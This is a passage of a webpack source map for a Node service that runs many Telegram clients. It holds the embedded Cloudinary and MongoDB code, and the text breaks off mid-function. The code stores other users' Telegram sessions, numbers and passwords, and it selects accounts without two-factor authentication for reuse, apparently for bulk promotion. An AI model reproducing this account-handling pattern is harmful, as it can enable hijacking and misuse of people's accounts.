CA;AACA,kCAAkC,gBAAgB;AAClD;AACA,2CAA2C,YAAY,OAAO,GAAG;AACjE;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,oCAAoC,gBAAgB;AACpD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,kCAAkC,gBAAgB;AAClD,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,kCAAkC,gBAAgB;AAClD;AACA;AACA;AACA;AACA;AACA;AACA,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,kCAAkC,gBAAgB;AAClD;AACA;AACA;AACA;AACA;AACA;AACA,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,kCAAkC,gBAAgB;AAClD;AACA;AACA;AACA;AACA;AACA,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA;AACA,uCAAuC,kBAAkB;AACzD;AACA;AACA;AACA;AACA;AACA,mBAAmB,aAAa;AAChC,QAAQ;AACR,mBAAmB,aAAa;AAChC;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA,kBAAkB,uBAAuB;AACzC;AACA,8BAA8B,UAAU;AACxC;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,gCAAgC,SAAS,gBAAgB,IAAI,KAAK,eAAe;AACjF;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,sDAAsD,IAAI,iBAAiB,gBAAgB;AAC3F;AACA,gDAAgD,uEAAuE;AACvH;AACA,UAAU;AACV,gDAAgD,IAAI;AACpD;AACA;AACA;AACA,MAAM;AACN;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR,uFAAuF,UAAU;AACjG;AACA,MAAM;AACN;AACA;AACA;AACA;AACA,UAAU;AACV;AACA;AACA,OAAO;AACP;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,CAAC;AACD;AACA;AACA;AACA;AACA,iCAAiC,UAAU,8BAA8B,UAAU,IAAI,OAAO;AAC9F,yCAAyC,UAAU,IAAI,OAAO;AAC9D;AACA;AACA;AACA,iDAAiD,SAAS,cAAc,OAAO,KAAK,eAAe;AACnG;AACA,8CAA8C,UAAU,IAAI,OAAO;AACnE;AACA;AACA,uDAAuD,SAAS,cAAc,OAAO,KAAK,eAAe;AACzG;AACA,4CAA4C,SAAS,cAAc,OAAO,6EAA6E,eAAe;AACtK,iBAAiB;AACjB,gBAAgB;AAChB;AACA;AACA,aAAa;AACb,YAAY;AACZ,yDAAyD,UAAU,IAAI,OAAO;AAC9E;AACA,UAAU;AACV;AACA;AACA;AACA,OAAO;AACP,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA,CAAC;AACD;AACA;AACA,2DAA2D,KAAK;AAChE,CAAC;AACD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,8BAA8B,gCAAgC;AAC9D;AACA,qCAAqC,WAAW,UAAU,WAAW,cAAc,gBAAgB;AACnG,qCAAqC,MAAM,KAAK,gBAAgB;AAChE;AACA;AACA,iDAAiD,KAAK,gBAAgB,gBAAgB;AACtF;AACA;AACA;AACA,cAAc;AACd;AACA,wCAAwC,UAAU,QAAQ,mCAAmC,oBAAoB,iBAAiB;AAClI;AACA,8DAA8D,IAAI,eAAe,UAAU,KAAK,gBAAgB;AAChH;AACA,0CAA0C,UAAU,QAAQ,0CAA0C,iBAAiB,wBAAwB;AAC/I,gBAAgB;AAChB;AACA;AACA;AACA,YAAY;AACZ;AACA;AACA,UAAU;AACV;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,yCAAyC,UAAU,gBAAgB,iBAAiB;AACpF,8BAA8B,YAAY,gCAAgC,eAAe,IAAI,2BAA2B;AACxH;AACA,gCAAgC,UAAU,kCAAkC,eAAe;AAC3F;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,gCAAgC,UAAU,uBAAuB,SAAS;AAC1E;AACA;AACA,UAAU;AACV;AACA;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,eAAe,2BAA2B,IAAI,iBAAiB,EAAE,4BAA4B,0EAA0E,OAAO;AAC9K;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,eAAe,2BAA2B,OAAO,gBAAgB,MAAM,4BAA4B,0EAA0E,OAAO;AACpL;AACA;AACA;AACA;AACA;AACA,uCAAuC,kBAAkB;AACzD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,oDAAoD;AACpD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,YAAY,0FAA0F;AACtG;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,8CAA8C,MAAM;AACpD;AACA;AACA;AACA;AACA,8DAA8D,MAAM;AACpE;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,gBAAgB,uBAAuB,OAAO,2BAA2B,SAAS,eAAe;AACjG;AACA;AACA;AACA;AACA;AACA,iBAAiB,uBAAuB,OAAO,qBAAqB,QAAQ,uBAAuB;AACnG;AACA;AACA;AACA;AACA;AACA;AACA,iCAAiC;AACjC,4BAA4B,IAAI,MAAM;AACtC,6BAA6B,IAAI,OAAO;AACxC;AACA,gCAAgC;AAChC,6BAA6B,KAAK,OAAO;AACzC;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,+CAA+C;AAC/C;AACA;AACA;AACA,oBAAoB,yBAAyB;AAC7C;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA,yCAAyC,wDAAwD;AACjG;AACA;AACA;AACA;AACA;AACA;AACA,MAAM;AACN;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,YAAY;AACZ,4CAA4C,aAAa;AACzD;AACA;AACA;AACA,UAAU;AACV;AACA;AACA,QAAQ;AACR;AACA;AACA,MAAM;AACN;AACA;AACA;AACA;AACA;AACA,GAAG;AACH;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,+CAA+C,UAAU;AACzD;AACA;AACA,iDAAiD,yDAAyD;AAC1G;AACA;AACA;AACA;AACA;AACA;AACA,8CAA8C,SAAS;AACvD;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,QAAQ;AACR;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA,+CAA+C,UAAU;AACzD;AACA;AACA;AACA,iDAAiD,yDAAyD;AAC1G;AACA;AACA;AACA;AACA,qFAAqF,eAAe;AACpG;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,2CAA2C,kBAAkB;AAC7D;AACA,QAAQ;AACR;AACA,kCAAkC,UAAU,iDAAiD,SAAS;AACtG;AACA;AACA;AACA;AACA;AACA,gCAAgC,UAAU,4BAA4B,SAAS;AAC/E;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,+BAA+B,yCAAyC;AACxE;AACA;AACA;AACA,uDAAuD,SAAS;AAChE;AACA,uEAAuE,YAAY;AACnF;AACA;AACA;AACA,2DAA2D,YAAY,iBAAiB,GAAG;AAC3F;AACA,oCAAoC,UAAU,mCAAmC,SAAS,GAAG,YAAY,GAAG,iBAAiB;AAC7H;AACA,+BAA+B,wCAAwC,IAAI,UAAU;AACrF,4CAA4C,YAAY,iBAAiB,GAAG;AAC5E,UAAU;AACV,oCAAoC,UAAU,kCAAkC,SAAS,GAAG,YAAY,GAAG,iBAAiB;AAC5H;AACA;AACA;AACA;AACA;AACA;AACA,+CAA+C,gBAAgB;AAC/D;AACA,WAAW;AACX;AACA;AACA,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA;AACA,yFAAyF,YAAY,SAAS,KAAK,KAAK,gBAAgB;AACxI;AACA,4CAA4C,SAAS;AACrD,gCAAgC,UAAU,QAAQ,6CAA6C,SAAS,GAAG,YAAY,GAAG;AAC1H,MAAM;AACN;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,gDAAgD,sCAAsC;AACtF;AACA,MAAM;AACN;AACA,+CAA+C,mBAAmB,IAAI,0BAA0B;AAChG;AACA;AACA,+BAA+B,QAAQ,sBAAsB,YAAY;AACzE;AACA;AACA,oGAAoG,cAAc;AAClH,eAAe;AACf;AACA;AACA;AACA;AACA;AACA,sDAAsD,sCAAsC,IAAI,+DAA+D,YAAY,wEAAwE;AACnP;AACA,kCAAkC,uCAAuC;AACzE,sFAAsF,SAAS;AAC/F,8BAA8B,UAAU,sBAAsB,cAAc,GAAG,cAAc,GAAG,YAAY,GAAG,UAAU;AACzH;AACA;AACA;AACA,6FAA6F,uBAAuB;AACpH,QAAQ;AACR;AACA;AACA;AACA;AACA;AACA;AACA,MAAM;AACN;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,IAAI;AACJ;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,+CAA+C,YAAY,cAAc;AACzE;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,mFAAmF,iBAAiB;AACpG;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA;AACA,IAAI;AACJ,0BAA0B,qBAAqB;AAC/C;AACA","sources":["../external commonjs \"axios\"","../external commonjs \"body-parser\"","../external commonjs \"cloudinary\"","../external commonjs \"cors\"","../external commonjs \"dotenv\"","../external commonjs \"express\"","../external commonjs \"imap\"","../external commonjs \"mongodb\"","../external commonjs \"node-schedule-tz\"","../external commonjs \"swagger-jsdoc\"","../external commonjs \"swagger-ui-express\"","../external commonjs \"telegram\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events/index.js\"","../external commonjs \"telegram/sessions\"","../external node-commonjs \"child_process\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"",".././cloudinary.js",".././dbservice.js",".././mailreader.js",".././swaggerConfig.js",".././telegramManager.js",".././utils.js","../webpack/bootstrap",".././index.js"],"sourcesContent":["module.exports = require(\"axios\");","module.exports = require(\"body-parser\");","module.exports = require(\"cloudinary\");","module.exports = require(\"cors\");","module.exports = require(\"dotenv\");","module.exports = require(\"express\");","module.exports = require(\"imap\");","module.exports = require(\"mongodb\");","module.exports = require(\"node-schedule-tz\");","module.exports = require(\"swagger-jsdoc\");","module.exports = require(\"swagger-ui-express\");","module.exports = require(\"telegram\");","module.exports = require(\"telegram/client/uploads\");","module.exports = require(\"telegram/events/index.js\");","module.exports = require(\"telegram/sessions\");","module.exports = require(\"child_process\");","module.exports = require(\"fs\");","module.exports = require(\"path\");","console.log(\"in Cloudinary\");\r\nconst cloudinary = require('cloudinary');\r\nconst path = require('path');\r\nconst fs = require('fs');\r\nconst { fetchWithTimeout } = require('./utils');\r\n\r\nclass CloudinaryService {\r\n    static instance;\r\n    resources = new Map();\r\n\r\n    constructor() {\r\n        cloudinary.v2.config({\r\n            cloud_name: process.env.CL_NAME,\r\n            api_key: process.env.CL_APIKEY,\r\n            api_secret: process.env.CL_APISECRET\r\n        });\r\n    }\r\n\r\n    static async getInstance(name) {\r\n        if (!CloudinaryService.instance) {\r\n            CloudinaryService.instance = new CloudinaryService();\r\n        }\r\n        await CloudinaryService.instance.getResourcesFromFolder(name);\r\n        return CloudinaryService.instance;\r\n    }\r\n\r\n    async getResourcesFromFolder(folderName) {\r\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\r\n        await this.findAndSaveResources(folderName, 'image');\r\n    }\r\n\r\n    async createNewFolder(folderName) {\r\n        await this.createFolder(folderName);\r\n        await this.uploadFilesToFolder(folderName);\r\n    }\r\n\r\n    async overwriteFile() {\r\n        const cloudinaryFileId = \"index_nbzca5.js\";\r\n        const localFilePath = \"./src/test.js\";\r\n\r\n        try {\r\n\r\n            const result = await cloudinary.v2.uploader.upload(localFilePath, {\r\n                resource_type: 'auto',\r\n                overwrite: true,\r\n                invalidate: true,\r\n                public_id: cloudinaryFileId\r\n            });\r\n            console.log(result);\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n\r\n    }\r\n\r\n    async findAndSaveResources(folderName, type) {\r\n        try {\r\n            const { resources } = await cloudinary.v2.api.resources({ resource_type: type, type: 'upload', prefix: folderName, max_results: 500 });\r\n            resources.forEach(async (resource) => {\r\n                try {\r\n                    this.resources.set(resource.public_id.split('/')[1].split('_')[0], resource.url);\r\n                    await saveFile(resource.url, resource.public_id.split('/')[1].split('_')[0]);\r\n                } catch (error) {\r\n                    console.log(resource);\r\n                    console.log(error)\r\n                }\r\n\r\n            });\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    async createFolder(folderName) {\r\n        try {\r\n            const result = await cloudinary.v2.api.create_folder(folderName);\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error creating folder:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    // Function to upload files from URLs to a specific folder in Cloudinary\r\n    async uploadFilesToFolder(folderName) {\r\n        const uploadPromises = Array.from(this.resources.entries()).map(async ([key, url]) => {\r\n            try {\r\n                const result = await cloudinary.v2.uploader.upload_large(url, {\r\n                    folder: folderName,\r\n                    resource_type: 'auto',\r\n                    public_id: key, // Set the key as the public_id\r\n                });\r\n\r\n                return result;\r\n            } catch (error) {\r\n                console.error('Error uploading file:', error);\r\n                throw error;\r\n            }\r\n        });\r\n\r\n        try {\r\n            return await Promise.all(uploadPromises);\r\n        } catch (error) {\r\n            console.error('Error uploading files:', error);\r\n            throw error;\r\n        }\r\n    }\r\n\r\n    async printResources() {\r\n        try {\r\n            this.resources?.forEach((val, key) => {\r\n                console.log(key, \":\", val);\r\n            })\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    get(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n\r\n    getBuffer(publicId) {\r\n        try {\r\n            const result = this.resources.get(publicId)\r\n            return result || '';\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n    }\r\n}\r\n\r\nasync function saveFile(url, name) {\r\n    const extension = url.substring(url.lastIndexOf('.') + 1, url.length);\r\n    const mypath = path.resolve(__dirname, `./${name}.${extension}`);\r\n    fetchWithTimeout(url, { responseType: 'arraybuffer' }, 2)\r\n        .then(res => {\r\n            if (res?.statusText === 'OK') {\r\n                try {\r\n                    if (!fs.existsSync(mypath)) {\r\n                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                        console.log(`${name}.${extension} Saved!!`);\r\n                    } else {\r\n                        fs.unlinkSync(mypath);\r\n                        fs.writeFileSync(mypath, res.data, 'binary'); // Save binary data as a file\r\n                        console.log(`${name}.${extension} Replaced!!`);\r\n                    }\r\n                } catch (err) {\r\n                    console.error(err);\r\n                }\r\n            } else {\r\n                throw new Error(`Unable to download file from ${url}`);\r\n            }\r\n        }).catch(err => {\r\n            console.error(err);\r\n        });\r\n}\r\n\r\nmodule.exports = { CloudinaryService }\r\n\r\n\r\n\r\n","const { MongoClient, ServerApiVersion } = require('mongodb')\r\n\r\nclass ChannelService {\r\n    static instance;\r\n    client = undefined\r\n    db = undefined;\r\n    users = undefined;\r\n    statsDb = undefined;\r\n    statsDb2 = undefined;\r\n    isConnected = false;\r\n\r\n    constructor () {\r\n    }\r\n\r\n    static getInstance() {\r\n        if (!ChannelService.instance) {\r\n            ChannelService.instance = new ChannelService();\r\n        }\r\n        return ChannelService.instance;\r\n    }\r\n    static isInstanceExist() {\r\n        return !!ChannelService.instance;\r\n    }\r\n\r\n    async connect() {\r\n        if (!this.isConnected) {\r\n            console.log('trying to connect to DB......')\r\n            try {\r\n                this.client = await MongoClient.connect(process.env.mongouri, { useNewUrlParser: true, useUnifiedTopology: true, serverApi: ServerApiVersion.v1, maxPoolSize: 15 });\r\n                console.log('Connected to MongoDB');\r\n                this.isConnected = true;\r\n                this.client.on('close', () => {\r\n                    console.log('MongoDB connection closed.');\r\n                    this.isConnected = false;\r\n                });\r\n                this.db = this.client.db(\"tgclients\").collection('channels');\r\n                this.users = this.client.db(\"tgclients\").collection('users');\r\n                this.statsDb = this.client.db(\"tgclients\").collection('stats');\r\n                this.statsDb2 = this.client.db(\"tgclients\").collection('stats2');\r\n                return true;\r\n            } catch (error) {\r\n                console.log(`Error connecting to MongoDB: ${error}`);\r\n                return false;\r\n            }\r\n        } else {\r\n            console.log('MongoConnection ALready Existing');\r\n        }\r\n    }\r\n    async insertChannel(channelData) {\r\n        const {\r\n            title,\r\n            id,\r\n            username,\r\n            megagroup,\r\n            participantsCount,\r\n            restricted,\r\n            broadcast\r\n        } = channelData\r\n        const cannotSendMsgs = channelData.defaultBannedRights?.sendMessages\r\n        if (!cannotSendMsgs && !broadcast) {\r\n            await this.db.updateOne({ channelId: id.toString() }, { $set: { username: username, title, megagroup, participantsCount, broadcast, restricted, sendMessages: channelData.defaultBannedRights?.sendMessages, canSendMsgs: true } }, { upsert: true });\r\n        }\r\n    }\r\n    async getChannels(limit = 50, skip = 0, k) {\r\n        const query = { megagroup: true, username: { $ne: null } };\r\n        const sort = { participantsCount: -1 };\r\n        if (k) {\r\n            query[\"$or\"] = [{ title: { $regex: k, $options: 'i' } }, { username: { $regex: k, $options: 'i' } }]\r\n        }\r\n        const options = { collation: { locale: 'en', strength: 1 } };\r\n        try {\r\n            if (k) {\r\n                await this.db?.createIndex({ title: 'text' }); // Create index on the \"title\" field for text search\r\n            }\r\n            const result = await this.db\r\n                .find(query, options)\r\n                .sort(sort)\r\n                .skip(skip)\r\n                .limit(limit)\r\n                .toArray();\r\n\r\n            return result;\r\n        } catch (error) {\r\n            console.error('Error:', error);\r\n            return [];\r\n        }\r\n    }\r\n\r\n    async insertUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.findOne(filter);\r\n            if (!entry) {\r\n                await this.users.insertOne(user);\r\n            }\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async updateUser(user, data) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.updateOne(filter, {\r\n                $set: {\r\n                    ...data\r\n                },\r\n            }, { upsert: true });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async resetPaidUsers() {\r\n        try {\r\n            const collection = this.client.db(\"tgclients\").collection('userData');\r\n            const entry = await collection.updateMany({ $and: [{ payAmount: { $gt: 10 }, totalCount: { $gt: 50 } }] }, {\r\n                $set: {\r\n                    totalCount: 10,\r\n                    limitTime: Date.now()\r\n                }\r\n            });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async deleteUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.deleteOne(filter);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getUser(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const entry = await this.users.findOne(filter);\r\n            return entry\r\n        } catch (error) {\r\n            console.log(error)\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    async getuserdata(filter) {\r\n        try {\r\n            const collection = this.client.db(\"tgclients\").collection('userData');\r\n            const entry = await collection.findOne(filter);\r\n            return entry\r\n        } catch (error) {\r\n            console.log(error)\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    async updateUserData(filter, data) {\r\n        try {\r\n            const collection = this.client.db(\"tgclients\").collection('userData');\r\n            const entry = await collection.updateMany(filter, { $set: { ...data } });\r\n            return entry\r\n        } catch (error) {\r\n            console.log(error)\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    async getTempUser() {\r\n        try {\r\n            const entry = await this.users.findOne({});\r\n            return entry\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getUsersFullData(limit = 2, skip = 0) {\r\n        const result = await this.users?.find({}).skip(skip).limit(limit).sort({ _id: 1 }).toArray();\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async insertInBufferClients(user) {\r\n        const filter = { mobile: user.mobile };\r\n        try {\r\n            const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n            await bufferColl.updateOne(filter, { $set: { ...user } }, { upsert: true });\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async readBufferClients(filter, limit) {\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        const query = filter || {};\r\n        const queryWithLimit = limit ? bufferColl.find(query).limit(limit) : bufferColl.find(query);\r\n        const result = await queryWithLimit.toArray();\r\n        if (result?.length > 0) {\r\n            return result;\r\n        } else {\r\n            return [];\r\n        }\r\n    }\r\n\r\n\r\n    async getOneBufferClient(mobile = null) {\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        const today = new Date().toISOString().split('T')[0]\r\n        const query = { date: { $lte: today } }\r\n        if (mobile) {\r\n            query['mobile'] = mobile\r\n        }\r\n        const results = await bufferColl.find(query).toArray();\r\n        if (results.length) {\r\n            for (const result of results) {\r\n                if (result) {\r\n                    const alreadyExist = await this.getUserConfig({ number: `+${result.mobile}` });\r\n                    if (!alreadyExist) {\r\n                        return result\r\n                    } else {\r\n                        console.log(\"removing one already existing client\");\r\n                        const entry = await bufferColl.deleteMany({ mobile: result.mobile });\r\n                    }\r\n                } else {\r\n                    return undefined;\r\n                }\r\n            }\r\n        } else {\r\n            return undefined\r\n        }\r\n    }\r\n\r\n    async deleteBufferClient(user) {\r\n        const filter = { mobile: user.mobile };\r\n        const bufferColl = this.client.db(\"tgclients\").collection('bufferClients');\r\n        try {\r\n            const entry = await bufferColl.deleteOne(filter);\r\n        } catch (error) {\r\n            console.log(error)\r\n        }\r\n    }\r\n\r\n    async getNewBufferClients(ids) {\r\n        const cursor = this.users.find({ \"mobile\": { $nin: ids }, twoFA: { $exists: false } }).sort({ lastActive: 1 }).limit(20);\r\n        return cursor\r\n    }\r\n\r\n    async readPromoteStats() {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const result = await promotColl.find({}, { projection: { \"client\": 1, \"totalCount\": 1, \"lastUpdatedTimeStamp\": 1, \"isActive\": 1, \"_id\": 0 } }).sort({ totalCount: -1 }).toArray();\r\n        if (result.length > 0) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async checkIfPaidToOthers(chatId, profile) {\r\n        const resp = { paid: 0, demoGiven: 0 };\r\n        try {\r\n            const collection = this.client.db(\"tgclients\").collection('userData');\r\n            const document = await collection.find({ chatId, profile: { $exists: true, \"$ne\": profile }, payAmount: { $gte: 10 } }).toArray();\r\n            const document2 = await collection.find({ chatId, profile: { $exists: true, \"$ne\": profile }, demoGiven: true }).toArray();\r\n            if (document.length > 0) {\r\n                resp.paid = document.length\r\n            }\r\n            if (document2.length > 0) {\r\n                resp.demoGiven = document2.length\r\n            }\r\n        } catch (error) {\r\n            console.log(error);\r\n        }\r\n        return resp;\r\n    }\r\n\r\n\r\n    async readSinglePromoteStats(clientId) {\r\n        const promotColl = this.client.db(\"tgclients\").collection('promoteStats');\r\n        const result = await promotColl.findOne({ client: clientId }, { projection: { \"client\": 1, \"totalCount\": 1, \"lastUpdatedTimeStamp\": 1, \"isActive\": 1, \"_id\": 0 } });\r\n        return result\r\n    }\r\n\r\n    async readStats() {\r\n        const result = await this.statsDb.find({}).sort({ newUser: -1 })\r\n        if (result) {\r\n            return result.toArray();\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async read(chatId) {\r\n        const result = await this.db.findOne({ chatId });\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n    async removeOnefromChannel(filter) {\r\n        try {\r\n            await this.db.deleteOne(filter)\r\n        } catch (e) {\r\n            console.log(e)\r\n        }\r\n    }\r\n\r\n    async getUsers(limit, skip = 0) {\r\n        const result = await this.users?.find({}, { projection: { firstName: 1, userName: 1, mobile: 1, _id: 0 } }).skip(skip).limit(limit).toArray();\r\n        if (result) {\r\n            return result;\r\n        } else {\r\n            return undefined;\r\n        }\r\n    }\r\n\r\n    async getupi(key) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.findOne({});\r\n        return upiIds[key] || \"lakshmi-69@paytm\"\r\n    }\r\n\r\n    async getAllUpis() {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.findOne({});\r\n        return upiIds\r\n    }\r\n\r\n    async updateUpis(data) {\r\n        const upiDb = this.client.db(\"tgclients\").collection('upi-ids');\r\n        const upiIds = await upiDb.updateOne({}, { $set: { ...data } });\r\n        return upiIds\r\n    }\r\n\r\n    async getBuilds() {\r\n        const buildBd = this.client.db(\"tgclients\").collection('builds');\r\n        const builds = await buildBd.findOne({});\r\n        return builds\r\n    }\r\n\r\n    async updateBuilds(data) {\r\n        const buildBd = this.client.db(\"tgclients\").collection('builds');\r\n        const builds = await buildBd.updateOne({}, { $set: { ...data } }, { upsert: true });\r\n        return builds\r\n    }\r\n\r\n    async getUserConfig(filter) {\r\n        const clientDb = this.client.db(\"tgclients\").collection('clients');\r\n        const client = await clientDb.findOne(filter);\r\n        return client\r\n    }\r\n    async getUserInfo(filter) {\r\n        const clientDb = this.client.db(\"tgclients\").collection('clients');\r\n        const aggregationPipeline = [\r\n            { $match: filter },\r\n            {\r\n                $project: {\r\n                    \"_id\": 0,\r\n                    \"session\": 0,\r\n                    \"number\": 0,\r\n                    \"password\": 0,\r\n                }\r\n            }\r\n        ];\r\n        const result = await clientDb.aggregate(aggregationPipeline).toArray();\r\n        return result.length > 0 ? result[0] : null;\r\n    }\r\n    async updateUserConfig(filter, data) {\r\n        const upiDb = 